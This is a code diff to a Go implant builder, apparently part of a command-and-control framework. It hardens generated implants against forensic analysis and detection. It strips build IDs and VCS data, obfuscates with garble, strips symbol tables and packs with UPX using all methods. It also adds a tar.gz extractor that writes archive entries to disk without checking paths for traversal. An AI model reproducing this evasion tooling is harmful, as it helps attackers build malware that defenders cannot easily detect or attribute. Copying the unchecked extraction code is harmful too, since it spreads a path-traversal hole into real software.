@@ -1,11 +1,13 @@
 package core
 
 import (
+	"archive/tar"
+	"bytes"
+	"compress/gzip"
 	"crypto/rand"
 	"flag"
 	"fmt"
 	"io"
-	"io/fs"
 	"log"
 	"net/http"
 	"os"
@@ -87,9 +89,9 @@ func BuildImplant(cfg GenerateConfig) error {
 
 	goBin := findGo()
 
-	ldflags := "-s -w"
+	ldflags := "-s -w -buildid="
 	if cfg.Quiet && cfg.TargetOS == "windows" {
-		ldflags = "-s -w -H=windowsgui"
+		ldflags += " -H=windowsgui"
 	}
 
 	var builder string
@@ -100,11 +102,11 @@ func BuildImplant(cfg GenerateConfig) error {
 			return fmt.Errorf("garble not available: %w", err)
 		}
 		builder = garble
-		buildArgs = []string{"-literals", "-tiny", "build", "-trimpath", "-o", outPath, "-ldflags=" + ldflags, "./implant/"}
+		buildArgs = []string{"-literals", "-tiny", "build", "-trimpath", "-buildvcs=false", "-o", outPath, "-ldflags=" + ldflags, "./implant/"}
 		log.Printf("obfuscating with garble")
 	} else {
 		builder = goBin
-		buildArgs = []string{"build", "-trimpath", "-o", outPath, "-ldflags=" + ldflags, "./implant/"}
+		buildArgs = []string{"build", "-trimpath", "-buildvcs=false", "-o", outPath, "-ldflags=" + ldflags, "./implant/"}
 	}
 
 	cmd := exec.Command(builder, buildArgs...)
@@ -129,9 +131,15 @@ func BuildImplant(cfg GenerateConfig) error {
 	}
 	log.Printf("built %s", outPath)
 
+	// Best-effort strip for Linux/macOS to remove any remaining symbol tables
+	if cfg.TargetOS == "linux" || cfg.TargetOS == "darwin" {
+		stripCmd := exec.Command("strip", "-s", outPath)
+		_ = stripCmd.Run()
+	}
+
 	if cfg.UseUPX {
 		if upxPath, err := exec.LookPath("upx"); err == nil {
-			upx := exec.Command(upxPath, "--best", "--lzma", outPath)
+			upx := exec.Command(upxPath, "--best", "--lzma", "--all-methods", outPath)
 			upx.Stdout = os.Stdout
 			upx.Stderr = os.Stderr
 			if err := upx.Run(); err != nil {
@@ -227,28 +235,44 @@ func init() {
 }
 
 func extractEmbeddedSource(dst string) error {
-	src := "implant_src"
-	return fs.WalkDir(embedsrc.ImplantSource, src, func(path string, d fs.DirEntry, err error) error {
-		if err != nil {
-			return err
-		}
-		rel := strings.TrimPrefix(path, src)
-		if rel == "" {
-			return nil
-		}
-		rel = strings.TrimPrefix(rel, "/")
-		target := filepath.Join(dst, rel)
+	gz, err := gzip.NewReader(bytes.NewReader(embedsrc.ImplantSourceArchive))
+	if err != nil {
+		return fmt.Errorf("gzip reader: %w", err)
+	}
+	defer gz.Close()
 
-		if d.IsDir() {
-			return os.MkdirAll(target, 0755)
+	tr := tar.NewReader(gz)
+	for {
+		hdr, err := tr.Next()
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return fmt.Errorf("tar next: %w", err)
 		}
 
-		data, err := embedsrc.ImplantSource.ReadFile(path)
-		if err != nil {
-			return err
+		target := filepath.Join(dst, hdr.Name)
+		switch hdr.Typeflag {
+		case tar.TypeDir:
+			if err := os.MkdirAll(target, 0755); err != nil {
+				return err
+			}
+		case tar.TypeReg:
+			if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil {
+				return err
+			}
+			f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(hdr.Mode))
+			if err != nil {
+				return err
+			}
+			if _, err := io.Copy(f, tr); err != nil {
+				f.Close()
+				return err
+			}
+			f.Close()
 		}
-		return os.WriteFile(target, data, 0644)
-	})
+	}
+	return nil
 }
 
 func defaultPubKeyPath() string {
